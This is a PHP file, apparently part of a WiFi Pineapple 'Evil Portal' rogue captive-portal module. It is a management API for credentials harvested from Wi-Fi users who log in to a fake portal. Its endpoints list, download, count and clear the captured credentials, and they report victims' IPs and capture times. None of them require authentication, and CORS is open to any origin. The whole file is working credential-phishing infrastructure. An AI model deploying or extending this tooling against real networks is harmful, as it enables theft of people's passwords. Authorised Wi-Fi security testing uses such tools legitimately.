<?php
/**
 * Evil Portal - Helper API
 * Management endpoint for credentials, logs, and configuration.
 * 
 * Pineapple:  http://172.16.42.1/captiveportal/helper.php?action=status
 * Docker:     http://localhost/captiveportal/helper.php?action=status
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');

// Auto-detect base directory
$moduleDir = dirname(__DIR__);
if (basename($moduleDir) === 'captiveportal') {
    $moduleDir = dirname($moduleDir);
}
if (!is_dir($moduleDir . '/logs')) {
    mkdir($moduleDir . '/logs', 0755, true);
}

$credsFile  = $moduleDir . '/logs/creds.json';
$logFile    = $moduleDir . '/logs/access.log';
$configFile = $moduleDir . '/config.json';

$action = $_GET['action'] ?? '';

switch ($action) {

    case 'status':
        $credsCount = 0;
        if (file_exists($credsFile)) {
            $data = json_decode(file_get_contents($credsFile), true);
            $credsCount = is_array($data) ? count($data) : 0;
        }
        $profile = 'default';
        $ssid = '';
        $enabled = true;
        if (file_exists($configFile)) {
            $cfg = json_decode(file_get_contents($configFile), true);
            $profile = $cfg['profile'] ?? 'default';
            $ssid    = $cfg['ssid']    ?? '';
            $enabled = $cfg['enabled'] ?? true;
        }
        echo json_encode([
            'status' => 'ok',
            'version' => '3.0',
            'profile' => $profile,
            'ssid'    => $ssid,
            'enabled' => $enabled,
            'creds_harvested' => $credsCount,
            'module_dir' => $moduleDir,
            'timestamp'  => date('c')
        ], JSON_PRETTY_PRINT);
        break;

    case 'creds':
        if (file_exists($credsFile)) {
            $data = json_decode(file_get_contents($credsFile), true);
            echo json_encode($data ?: [], JSON_PRETTY_PRINT);
        } else {
            echo json_encode([]);
        }
        break;

    case 'logs':
        $lines = [];
        if (file_exists($logFile)) {
            $raw = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $raw = array_slice($raw, -200);
            foreach ($raw as $line) {
                $decoded = json_decode($line, true);
                if ($decoded) $lines[] = $decoded;
            }
        }
        echo json_encode($lines, JSON_PRETTY_PRINT);
        break;

    case 'clear':
        $cleared = [];
        foreach ([$credsFile, $logFile] as $f) {
            if (file_exists($f)) {
                unlink($f);
                $cleared[] = basename($f);
            }
        }
        echo json_encode(['status' => 'cleared', 'files' => $cleared, 'timestamp' => date('c')]);
        break;

    case 'config':
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $input = json_decode(file_get_contents('php://input'), true);
            if ($input && is_array($input)) {
                $safe = [
                    'profile' => preg_replace('/[^a-z0-9_-]/i', '', $input['profile'] ?? 'default'),
                    'ssid'    => substr($input['ssid'] ?? '', 0, 64),
                    'enabled' => filter_var($input['enabled'] ?? true, FILTER_VALIDATE_BOOLEAN)
                ];
                file_put_contents($configFile, json_encode($safe, JSON_PRETTY_PRINT));
                echo json_encode(['status' => 'saved', 'config' => $safe]);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Invalid JSON body']);
            }
        } else {
            if (file_exists($configFile)) {
                echo file_get_contents($configFile);
            } else {
                echo json_encode(['profile' => 'default', 'ssid' => '', 'enabled' => true], JSON_PRETTY_PRINT);
            }
        }
        break;

    case 'download':
        if (file_exists($credsFile)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="creds_' . date('Y-m-d_H-i-s') . '.json"');
            header('Content-Length: ' . filesize($credsFile));
            readfile($credsFile);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'No credentials captured yet']);
        }
        break;

    case 'stats':
        $stats = ['total_creds' => 0, 'unique_ips' => [], 'profiles' => [], 'first_capture' => null, 'last_capture' => null];
        if (file_exists($credsFile)) {
            $creds = json_decode(file_get_contents($credsFile), true) ?: [];
            $stats['total_creds'] = count($creds);
            $ips = [];
            $profs = [];
            foreach ($creds as $c) {
                if (!empty($c['ip'])) $ips[$c['ip']] = true;
                if (!empty($c['profile'])) $profs[$c['profile']] = true;
                if (!empty($c['timestamp'])) {
                    if (!$stats['first_capture'] || $c['timestamp'] < $stats['first_capture']) $stats['first_capture'] = $c['timestamp'];
                    if (!$stats['last_capture'] || $c['timestamp'] > $stats['last_capture']) $stats['last_capture'] = $c['timestamp'];
                }
            }
            $stats['unique_ips'] = array_keys($ips);
            $stats['profiles'] = array_keys($profs);
        }
        echo json_encode($stats, JSON_PRETTY_PRINT);
        break;

    default:
        echo json_encode([
            'status' => 'ok',
            'message' => 'Evil Portal Universal API v3.0',
            'endpoints' => [
                'status'   => 'GET  ?action=status',
                'creds'    => 'GET  ?action=creds',
                'logs'     => 'GET  ?action=logs',
                'stats'    => 'GET  ?action=stats',
                'clear'    => 'GET  ?action=clear',
                'config'   => 'GET/POST ?action=config',
                'download' => 'GET  ?action=download'
            ]
        ], JSON_PRETTY_PRINT);
        break;
}
